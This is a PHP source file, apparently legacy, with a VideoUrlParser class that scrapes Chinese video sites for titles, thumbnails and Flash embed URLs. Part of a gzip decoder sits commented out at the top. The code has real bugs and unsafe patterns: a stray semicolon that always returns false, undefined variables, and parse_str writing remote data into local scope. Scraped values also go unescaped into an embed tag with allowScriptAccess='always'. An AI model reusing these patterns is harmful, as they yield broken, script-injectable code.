//             $headerlen += $filenamelen + 1;
//         }
     
//         $commentlen = 0;
//         $comment = "";
//         if ($flags & 16) {
//             // C-style string COMMENT data in header 
//             if ($len - $headerlen - 1 < 8) {
//                 return false; // Invalid format 
//             }
//             $commentlen = strpos ( substr ( $data, 8 + $extralen + $filenamelen ), chr ( 0 ) );
//             if ($commentlen === false || $len - $headerlen - $commentlen - 1 < 8) {
//                 return false; // Invalid header format 
//             }
//             $comment = substr ( $data, $headerlen, $commentlen );
//             $headerlen += $commentlen + 1;
//         }
     
//         $headercrc = "";
//         if ($flags & 1) {
//             // 2-bytes (lowest order) of CRC32 on header present 
//             if ($len - $headerlen - 2 < 8) {
//                 return false; // Invalid format 
//             }
//             $calccrc = crc32 ( substr ( $data, 0, $headerlen ) ) & 0xffff;
//             $headercrc = unpack ( "v", substr ( $data, $headerlen, 2 ) );
//             $headercrc = $headercrc [1];
//             if ($headercrc != $calccrc) {
//                 return false; // Bad header CRC 
//             }
//             $headerlen += 2;
//         }
     
//         // GZIP FOOTER - These be negative due to PHP's limitations 
//         $datacrc = unpack ( "V", substr ( $data, - 8, 4 ) );
//         $datacrc = $datacrc [1];
//         $isize = unpack ( "V", substr ( $data, - 4 ) );
//         $isize = $isize [1];
     
//         // Perform the decompression: 
//         $bodylen = $len - $headerlen - 8;
//         if ($bodylen < 1) {
//             // This should never happen - IMPLEMENTATION BUG! 
//             return null;
//         }
//         $body = substr ( $data, $headerlen, $bodylen );
//         $data = "";
//         if ($bodylen > 0) {
//             switch ($method) {
//                 case 8 :
//                     // Currently the only supported compression method: 
//                     $data = gzinflate ( $body );
//                     break;
//                 default :
//                     // Unknown compression method 
//                     return false;
//             }
//         } else {
//             //...
//         }
     
//         if ($isize != strlen ( $data ) || crc32 ( $data ) != $datacrc) {
//             // Bad format!  Length or CRC doesn't match! 
//             return false;
//         }
//         return $data;
//     }
// }
 class VideoUrlParser{

    const USER_AGENT = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko)
        Chrome/8.0.552.224 Safari/534.10";
    const CHECK_URL_VALID = "/(youku\.com|tudou\.com|ku6\.com|56\.com|letv\.com|video\.sina\.com\.cn|(my\.)?tv\.sohu\.com|v\.qq\.com)/";

    /**
     * parse 
     * 
     * @param string $url 
     * @param mixed $createObject 
     * @static
     * @access public
     * @return void
     */
     public function parse($url='', $createObject=true){
        $lowerurl = strtolower($url);
        preg_match(self::CHECK_URL_VALID, $lowerurl, $matches);
        if(!$matches) return false;

        switch($matches[1]){
        case 'youku.com':
            $data = self::_parseYouku($url);
            break;
        case 'tudou.com':
            $data = self::_parseTudou($url);
            break;
        case 'ku6.com':
            $data = self::_parseKu6($url);
            break;
        case '56.com':
            $data = self::_parse56($url);
            break;
        case 'letv.com':
            $data = self::_parseLetv($url);
            break;
        case 'video.sina.com.cn':
            $data = self::_parseSina($url);
            break;
        case 'my.tv.sohu.com':
        case 'tv.sohu.com':
        case 'sohu.com':
            $data = self::_parseSohu($url);
            break;
        case 'v.qq.com':
            $data = self::_parseQq($url);
            break;
        default:
            $data = false;
        }

        if($data && $createObject) $data['object'] = "<embed src=\"{$data['swf']}\" quality=\"high\" width=\"480\" height=\"400\" align=\"middle\" allowNetworking=\"all\" allowScriptAccess=\"always\" type=\"application/x-shockwave-flash\"></embed>";
        return $data;
    }
    /**
     * 腾讯视频 
     * http://v.qq.com/cover/o/o9tab7nuu0q3esh.html?vid=97abu74o4w3_0
     * http://v.qq.com/play/97abu74o4w3.html
     * http://v.qq.com/cover/d/dtdqyd8g7xvoj0o.html
     * http://v.qq.com/cover/d/dtdqyd8g7xvoj0o/9SfqULsrtSb.html
     * http://imgcache.qq.com/tencentvideo_v1/player/TencentPlayer.swf?_v=20110829&vid=97abu74o4w3&autoplay=1&list=2&showcfg=1&tpid=23&title=%E7%AC%AC%E4%B8%80%E7%8E%B0%E5%9C%BA&adplay=1&cid=o9tab7nuu0q3esh
     */ 
    private function _parseQq($url){
        if(preg_match("/\/play\//", $url)){
            $html = self::_fget($url);
            preg_match("/url=[^\"]+/", $html, $matches);
            if(!$matches); return false;
            $url = $matches[0];
        }
        preg_match("/vid=([^\_]+)/", $url, $matches);
        $vid = $matches[1];
        $html = self::_fget($url);
        // query
        preg_match("/flashvars\s=\s\"([^;]+)/s", $html, $matches);
        $query = $matches[1];
        if(!$vid){
            preg_match("/vid\s?=\s?vid\s?\|\|\s?\"(\w+)\";/i", $html, $matches);
            $vid = $matches[1];
        }
        $query = str_replace('"+vid+"', $vid, $query);
        parse_str($query, $output);
        $data['img'] = "http://vpic.video.qq.com/{$$output['cid']}/{$vid}_1.jpg";
        $data['url'] = $url;
        $data['title'] = $output['title'];
        $data['swf'] = "http://imgcache.qq.com/tencentvideo_v1/player/TencentPlayer.swf?".$query;
        return $data;
    }
    

    /**
     * 优酷网 
     * http://v.youku.com/v_show/id_XMjI4MDM4NDc2.html
     * http://player.youku.com/player.php/sid/XMjU0NjI2Njg4/v.swf
     */ 
    private function _parseYouku($url){
        preg_match("#id\_(\w+)#", $url, $matches);

        if (empty($matches)){
            preg_match("#v_playlist\/#", $url, $mat);
            if(!$mat) return false;

            $html = self::_fget($url);

            preg_match("#videoId2\s*=\s*\'(\w+)\'#", $html, $matches);
            if(!$matches) return false;
        }

        $link = "http://v.youku.com/player/getPlayList/VideoIDS/{$matches[1]}/timezone/+08/version/5/source/out?password=&ran=2513&n=3";

        $retval = self::_cget($link);
        if ($retval) {
            $json = json_decode($retval, true);

            $data['img'] = $json['data'][0]['logo'];
            $data['title'] = $json['data'][0]['title'];
            $data['url'] = $url;
            $data['swf'] = "http://player.youku.com/player.php/sid/{$matches[1]}/v.swf";

            return $data;
        } else {
            return false;
        }
    }

    /**
     * 土豆网
     * http://www.tudou.com/programs/view/Wtt3FjiDxEE/
     * http://www.tudou.com/v/Wtt3FjiDxEE/v.swf
     * 
     * http://www.tudou.com/playlist/p/a65718.html?iid=74909603
     * http://www.tudou.com/l/G5BzgI4lAb8/&iid=74909603/v.swf
     */
    private function _parseTudou($url){
        preg_match("#view/([-\w]+)/#", $url, $matches);

        if (empty($matches)) {
            if (strpos($url, "/playlist/") == false) return false;

            if(strpos($url, 'iid=') !== false){
                $quarr = explode("iid=", $lowerurl);
                if (empty($quarr[1]))  return false;
            }elseif(preg_match("#p\/l(\d+).#", $lowerurl, $quarr)){
                if (empty($quarr[1])) return false;
            }

            $html = self::_fget($url);
            $html = iconv("GB2312", "UTF-8", $html);

            preg_match("/lid_code\s=\slcode\s=\s[\'\"]([^\'\"]+)/s", $html, $matches);
            $icode = $matches[1];

            preg_match("/iid\s=\s.*?\|\|\s(\d+)/sx", $html, $matches);
            $iid = $matches[1];

            preg_match("/listData\s=\s(\[\{.*\}\])/sx", $html, $matches);
            
            $find = array("/\n/", '/\s/', "/:[^\d\"]\w+[^\,]*,/i", "/(\{|,)(\w+):/");
            $replace = array("", "", ':"",', '\\1"\\2":');
            $str = preg_replace($find, $replace, $matches[1]);
            //var_dump($str);
            $json = json_decode($str);
            //var_dump($json);exit;
            if(is_array($json) || is_object($json) && !empty($json)){
                foreach ($json as $val) {
                    if ($val->iid == $iid) {
                        break;
                    }
                }
            }

            $data['img'] = $val->pic;
            $data['title'] = $val->title;
            $data['url'] = $url;
            $data['swf'] = "http://www.tudou.com/l/{$icode}/&iid={$iid}/v.swf";

            return $data;
        }

        $host = "www.tudou.com";
        $path = "/v/{$matches[1]}/v.swf";

        $ret = self::_fsget($path, $host);

        if (preg_match("#\nLocation: (.*)\n#", $ret, $mat)) {
            parse_str(parse_url(urldecode($mat[1]), PHP_URL_QUERY));

            $data['img'] = $snap_pic;
            $data['title'] = $title;
            $data['url'] = $url;
            $data['swf'] = "http://www.tudou.com/v/{$matches[1]}/v.swf";

            return $data;
        }
        return false;
    }

    /**
     * 酷6网 
     * http://v.ku6.com/film/show_520/3X93vo4tIS7uotHg.html
     * http://v.ku6.com/special/show_4926690/Klze2mhMeSK6g05X.html
     * http://v.ku6.com/show/7US-kDXjyKyIInDevhpwHg...html
     * http://player.ku6.com/refer/3X93vo4tIS7uotHg/v.swf
     */
    private function _parseKu6($url){
        if(preg_match("/show\_/", $url)){
            preg_match("#/([-\w]+)\.html#", $url, $matches);
            $url = "http://v.ku6.com/fetchVideo4Player/{$matches[1]}.html";
            $html = self::_fget($url);

            if ($html) {
                $json = json_decode($html, true);
                if(!$json) return false;
                
                $data['img'] = $json['data']['picpath'];
                $data['title'] = $json['data']['t'];
                $data['url'] = $url;
                $data['swf'] = "http://player.ku6.com/refer/{$matches[1]}/v.swf";

                return $data;
            } else {
                return false;
            }
        }elseif(preg_match("/show\//", $url, $matches)){
            $html = self::_fget($url);
            preg_match("/ObjectInfo\s?=\s?([^\n]*)};/si", $html, $matches);
            $str = $matches[1];
            // img
            preg_match("/cover\s?:\s?\"([^\"]+)\"/", $str, $matches);
            $data['img'] = $matches[1];
            // title
            preg_match("/title\"?\s?:\s?\"([^\"]+)\"/", $str, $matches);
            $jsstr = "{\"title\":\"{$matches[1]}\"}";
            $json = json_decode($jsstr, true);
            $data['title'] = $json['title'];
            // url
            $data['url'] = $url;
            // query
            preg_match("/\"(vid=[^\"]+)\"\sname=\"flashVars\"/s", $html, $matches);
            $query = str_replace("&amp;", '&', $matches[1]);
            preg_match("/\/\/player\.ku6cdn\.com[^\"\']+/", $html, $matches);
            $data['swf'] = 'http:'.$matches[0].'?'.$query;
            
            return $data;
        }
    }

    /**
     * 56网
     * http://www.56.com/u73/v_NTkzMDcwNDY.html
     * http://player.56.com/v_NTkzMDcwNDY.swf
     */
    private function _parse56($url){
        preg_match("#/v_(\w+)\.html#", $url, $matches);

        if (empty($matches)) return false;

        $link="http://vxml.56.com/json/{$matches[1]}/?src=out";
        $retval = self::_cget($link);

        if ($retval) {
            $json = json_decode($retval, true);

            $data['img'] = $json['info']['img'];
            $data['title'] = $json['info']['Subject'];
            $data['url'] = $url;
            $data['swf'] = "http://player.56.com/v_{$matches[1]}.swf";

            return $data;
        } else {
            return false;
        } 
    }

    /**
     * 乐视网 
     * http://www.letv.com/ptv/vplay/1168109.html
     * http://www.letv.com/player/x1168109.swf
     */
    private function _parseLetv($url){
        $html = self::_fget($url);
        preg_match("#http://v.t.sina.com.cn/([^'\"]*)#", $html, $matches);
        parse_str(parse_url(urldecode($matches[0]), PHP_URL_QUERY));
        preg_match("#vplay/(\d+)#", $url, $matches);
        $data['img'] = $pic;
        $data['title'] = $title;
        $data['url'] = $url;
        $data['swf'] = "http://www.letv.com/player/x{$matches[1]}.swf";

        return $data;
    }

    // 搜狐TV http://my.tv.sohu.com/u/vw/5101536
    private function _parseSohu($url){
        $html = self::_fget($url);
        $html = iconv("GB2312", "UTF-8", $html);
        preg_match_all("/og:(?:title|image|videosrc)\"\scontent=\"([^\"]+)\"/s", $html, $matches);
        $data['img'] = $matches[1][1];
        $data['title'] = $matches[1][0];
        $data['url'] = $url;
        $data['swf'] = $matches[1][2];
        return $data;
    }
        
    /*
     * 新浪播客
     * http://video.sina.com.cn/v/b/48717043-1290055681.html
     * http://you.video.sina.com.cn/api/sinawebApi/outplayrefer.php/vid=48717043_1290055681_PUzkSndrDzXK+l1lHz2stqkP7KQNt6nki2O0u1ehIwZYQ0/XM5GdatoG5ynSA9kEqDhAQJA4dPkm0x4/s.swf
     */
    private function _parseSina($url){
        preg_match("/(\d+)(?:\-|\_)(\d+)/", $url, $matches);
        $url = "http://video.sina.com.cn/v/b/{$matches[1]}-{$matches[2]}.html";
        $html = self::_fget($url);
        preg_match("/video\s?:\s?([^<]+)}/", $html, $matches);
        $find = array("/\n/", "/\s*/", "/\'/", "/\{([^:,]+):/", "/,([^:]+):/", "/:[^\d\"]\w+[^\,]*,/i");
        $replace = array('', '', '"', '{"\\1":', ',"\\1":', ':"",');
        $str = preg_replace($find, $replace, $matches[1]);
        $arr = json_decode($str, true);

        $data['img'] = $arr['pic'];
        $data['title'] = $arr['title'];
        $data['url'] = $url;
        $data['swf'] = $arr['swfOutsideUrl'];
        
        return $data;
    }

    /*
     * 通过 file_get_contents 获取内容
     */
    private function _fget($url=''){
        if(!$url) return false;
        $html = file_get_contents($url);
        // 判断是否gzip压缩
        if($dehtml = self::_gzdecode($html))
            return $dehtml;
        else
            return $html;
    }

    /*
     * 通过 fsockopen 获取内容
     */
    private function _fsget($path='/', $host='', $user_agent=''){
        if(!$path || !$host) return false;
        $user_agent = $user_agent ? $user_agent : self::USER_AGENT;

        $out = <<<HEADER
GET $path HTTP/1.1
Host: $host
User-Agent: $user_agent
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-cn,zh;q=0.5
Accept-Charset: GB2312,utf-8;q=0.7,*;q=0.7\r\n\r\n
HEADER;
        $fp = @fsockopen($host, 80, $errno, $errstr, 10);
        if (!$fp)  return false;
        if(!fputs($fp, $out)) return false;
        while ( !feof($fp) ) {
            $html .= fgets($fp, 1024);
        }
        fclose($fp);
        // 判断是否gzip压缩
        if($dehtml = self::_gzdecode($html))
            return $dehtml;
        else
            return $html;
    }

    /*
     * 通过 curl 获取内容
     */
    private function _cget($url='', $user_agent=''){
        if(!$url) return;

        $user_agent = $user_agent ? $user_agent : self::USER_AGENT;
        if (function_exists("curl_init")) {
            $ch = curl_init();
        }else{
            ?>
            <script type="text/javascript">alert("请浏览主题\"framework\"的ReadMe.txt")</script>
            <?php
            return;
        }
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        if(strlen($user_agent)) curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);

        ob_start();
        curl_exec($ch);
        $html = ob_get_contents();        
        ob_end_clean();

        if(curl_errno($ch)){
            curl_close($ch);
            return false;
        }
        curl_close($ch);
        if(!is_string($html) || !strlen($html)){
            return false;
        }
        return $html;
        // 判断是否gzip压缩
        if($dehtml = self::_gzdecode($html))
            return $dehtml;
        else
            return $html;
    }
    
    private function _gzdecode($data) {
        $len = strlen ( $data );
        if ($len < 18 || strcmp ( substr ( $data, 0, 2 ), "\x1f\x8b" )) {
            return null; // Not GZIP format (See RFC 1952) 
        }
        $method = ord ( substr ( $data, 2, 1 ) ); // Compression method 
        $flags = ord ( substr ( $data, 3, 1 ) ); // Flags 
        if ($flags & 31 != $flags) {
            // Reserved bits are set -- NOT ALLOWED by RFC 1952 
            return null;
        }
        // NOTE: $mtime may be negative (PHP integer limitations) 
        $mtime = unpack ( "V", substr ( $data, 4, 4 ) );
        $mtime = $mtime [1];
        $xfl = substr ( $data, 8, 1 );
        $os = substr ( $data, 8, 1 );
        $headerlen = 10;
        $extralen = 0;
        $extra = "";
        if ($flags & 4) {
            // 2-byte length prefixed EXTRA data in header 
            if ($len - $headerlen - 2 < 8) {
                return false; // Invalid format 
            }
            $extralen = unpack ( "v", substr ( $data, 8, 2 ) );
            $extralen = $extralen [1];
            if ($len - $headerlen - 2 - $extralen < 8) {
                return false; // Invalid format 
            }
            $extra = substr ( $data, 10, $extralen );
            $headerlen += 2 + $extralen;
        }
     
        $filenamelen = 0;
        $filename = "";
        if ($flags & 8) {
            // C-style string file NAME data in header 
            if ($len - $headerlen - 1 < 8) {
                return false; // Invalid format 
            }
            $filenamelen = strpos ( substr ( $data, 8 + $extralen ), chr ( 0 ) );
            if ($filenamelen === false || $len - $headerlen - $filenamelen - 1 < 8) {
                return false; // Invalid format 
            }
            $filename = substr ( $data, $headerlen, $filenamelen );
            $headerlen += $filenamelen + 1;
        }
     
        $commentlen = 0;
        $comment = "";
        if ($flags & 16) {
            // C-style string COMMENT data in header 
            if ($len - $headerlen - 1 < 8) {
                return false; // Invalid format 
            }
            $commentlen = strpos ( substr ( $data, 8 + $extralen + $filenamelen ), chr ( 0 ) );
            if ($commentlen === false || $len - $headerlen - $commentlen - 1 < 8) {
                return false; // Invalid header format 
            }
            $comment = substr ( $data, $headerlen, $commentlen );
            $headerlen += $commentlen + 1;
        }
     
        $headercrc = "";
        if ($flags & 1) {
            // 2-bytes (lowest order) of CRC32 on header present 
            if ($len - $headerlen - 2 < 8) {
                return false; // Invalid format 
            }
            $calccrc = crc32 ( substr ( $data, 0, $headerlen ) ) & 0xffff;
            $headercrc = unpack ( "v", substr ( $data, $headerlen, 2 ) );
            $headercrc = $headercrc [1];
            if ($headercrc != $calccrc) {
                return false; // Bad header CRC 
            }
            $headerlen += 2;
        }
     
        // GZIP FOOTER - These be negative due to PHP's limitations 
        $datacrc = unpack ( "V", substr ( $data, - 8, 4 ) );
        $datacrc = $datacrc [1];
        $isize = unpack ( "V", substr ( $data, - 4 ) );
        $isize = $isize [1];
     
        // Perform the decompression: 
        $bodylen = $len - $headerlen - 8;
        if ($bodylen < 1) {
            // This should never happen - IMPLEMENTATION BUG! 
            return null;
        }
        $body = substr ( $data, $headerlen, $bodylen );
        $data = "";
        if ($bodylen > 0) {
            switch ($method) {
                case 8 :
                    // Currently the only supported compression method: 
                    $data = gzinflate ( $body );
                    break;
                default :
                    // Unknown compression method 
                    return false;
            }
        } else {
            //...
        }
     
        if ($isize != strlen ( $data ) || crc32 ( $data ) != $datacrc) {
            // Bad format!  Length or CRC doesn't match! 
            return false;
        }
        return $data;
    }

}